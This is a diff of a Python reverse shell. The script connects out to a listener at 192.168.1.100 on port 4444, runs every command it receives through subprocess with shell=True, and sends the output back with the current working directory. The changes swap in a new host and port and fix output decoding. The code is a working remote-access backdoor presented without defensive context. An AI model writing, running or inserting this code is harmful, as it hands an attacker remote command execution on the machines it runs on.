@@ -4,8 +4,8 @@ import os
 import socket
 import subprocess
 
-HOST = '192.168.1.1' # The ip of the listener.
-PORT = 443 # The same port as listener.
+HOST = '192.168.1.100' # The ip of the listener.
+PORT = 4444 # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT)) # Connect to listener.
@@ -21,9 +21,9 @@ while 1: # Start loop.
     if len(data) > 0:
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
         stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-        output_str = str(stdout_value) # Format output.
+        output_str = str(stdout_value, "UTF-8") # Format output.
         currentWD = os.getcwd() + "> " # Get current working directory.
-        s.send(str.encode(output_str + currentWD)) # Send output to listener.
+        s.send(str.encode(currentWD + output_str)) # Send output to listener.
     
 s.close() # Close socket.
 
